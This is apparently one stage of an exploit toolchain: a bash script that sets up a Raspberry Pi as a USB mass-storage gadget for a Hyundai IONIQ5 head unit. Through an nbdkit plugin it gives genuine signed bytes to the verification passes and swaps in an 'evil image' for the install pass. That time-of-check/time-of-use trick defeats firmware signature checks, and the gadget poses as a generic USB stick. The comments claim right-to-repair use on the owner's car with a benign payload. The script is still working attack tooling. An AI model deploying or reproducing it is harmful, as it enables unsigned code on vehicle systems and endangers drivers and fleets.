#!/bin/bash
# Bring the Pi up as a dynamic USB mass-storage device for the owner's own IONIQ5
# (decommissioned, off-road; right-to-repair). It presents build/usb.img to the head unit,
# but the rootfs byte-region described in build/regions.json is served dynamically by the
# nbdkit plugin: genuine (signed) bytes for the verify pass(es), the byte-exact evil image
# for the install pass. Benign proof payload only.
#
# Chain:  nbdkit (python plugin) --TCP--> nbd-client --> /dev/nbd0 --> configfs
#         f_mass_storage lun.0 --> dwc2 UDC --> head unit's USB port
#
#   sudo ./03_deploy_gadget.sh            # uses build/usb.img + build/regions.json
#   sudo ./03_deploy_gadget.sh /path/to/usb.img /path/to/regions.json
#
# Run 99_teardown.sh to unwind everything.
set -euo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"
IMG="${1:-$HERE/build/usb.img}"
REGIONS="${2:-$HERE/build/regions.json}"
PLUGIN="$HERE/nbdkit_toctou.py"
PORT=10809
GADGET=/sys/kernel/config/usb_gadget/ioniq_toctou
LOG=/var/log/toctou.log

[ "$(id -u)" -eq 0 ] || { echo "run as root (sudo)"; exit 1; }
for f in "$IMG" "$REGIONS" "$PLUGIN"; do test -f "$f" || { echo "missing: $f"; exit 1; }; done
command -v nbdkit     >/dev/null || { echo "install nbdkit (apt install nbdkit)"; exit 1; }
command -v nbd-client >/dev/null || { echo "install nbd-client (apt install nbd-client)"; exit 1; }

echo "[*] 1/5 kernel modules: dwc2, libcomposite, nbd"
modprobe dwc2 || true          # dtoverlay=dwc2 must already be in /boot/firmware/config.txt
modprobe libcomposite
modprobe nbd max_part=0

echo "[*] 2/5 nbdkit serving $PLUGIN on 127.0.0.1:$PORT"
# -f foreground? No: background it, capture pid. --newstyle default. One export "default".
nbdkit --pidfile /run/toctou-nbdkit.pid -i 127.0.0.1 -p "$PORT" \
    python "$PLUGIN" baseline="$IMG" regions="$REGIONS" log="$LOG" reads=/var/log/toctou-reads.log
sleep 1
test -c /dev/null  # noop; nbdkit forks and writes pidfile
echo "    nbdkit pid=$(cat /run/toctou-nbdkit.pid 2>/dev/null || echo '?')  log=$LOG"

echo "[*] 3/5 attaching /dev/nbd0"
# At boot the loopback/net stack may lag; getaddrinfo on 127.0.0.1 can fail with
# "Address family for hostname not supported" before ::1 exists. Retry until reachable.
for attempt in $(seq 1 15); do
    nbd-client -N default 127.0.0.1 "$PORT" /dev/nbd0 -persist && break
    echo "    nbd-client attempt $attempt failed (stack not ready?); retry in 2s"
    sleep 2
    [ "$attempt" -eq 15 ] && { echo "nbd-client failed after retries"; exit 1; }
done
# Keep the Pi's own page cache from masking per-pass swaps (RAM<rootfs already helps):
blockdev --setra 0 /dev/nbd0 2>/dev/null || true
echo "    /dev/nbd0 size=$(blockdev --getsize64 /dev/nbd0 2>/dev/null) bytes"

echo "[*] 4/5 configfs USB mass-storage gadget"
cd /sys/kernel/config/usb_gadget
mkdir -p "$GADGET"; cd "$GADGET"
echo 0x0781 > idVendor          # looks like a generic USB stick (cosmetic only)
echo 0x5591 > idProduct
echo 0x0200 > bcdUSB
echo 0x0100 > bcdDevice
mkdir -p strings/0x409
echo "0001"          > strings/0x409/serialnumber
echo "Generic"       > strings/0x409/manufacturer
echo "USB DISK"      > strings/0x409/product
mkdir -p configs/c.1/strings/0x409
echo "cfg1" > configs/c.1/strings/0x409/configuration
echo 250    > configs/c.1/MaxPower
mkdir -p functions/mass_storage.0
echo 1          > functions/mass_storage.0/stall
echo 1          > functions/mass_storage.0/lun.0/removable
echo 0          > functions/mass_storage.0/lun.0/ro
echo 0          > functions/mass_storage.0/lun.0/cdrom
echo /dev/nbd0  > functions/mass_storage.0/lun.0/file
ln -sf functions/mass_storage.0 configs/c.1/ 2>/dev/null || true

echo "[*] 5/5 binding to the dwc2 UDC"
UDC="$(ls /sys/class/udc | head -1)"
[ -n "$UDC" ] || { echo "no UDC found — is dtoverlay=dwc2 set and the data port used?"; exit 1; }
echo "$UDC" > UDC
echo "    bound to UDC: $UDC"
echo
echo "[READY] Plug the Pi's USB *data* port into the head unit."
echo "        Watch the swap:   tail -f $LOG"
echo "        Expect: 'region@... pass #1', 'pass #2', then '*** SWITCH at pass #2 ***'"
echo "        Then start the update on the HU. After it reboots, collect proof (STATUS.md)."
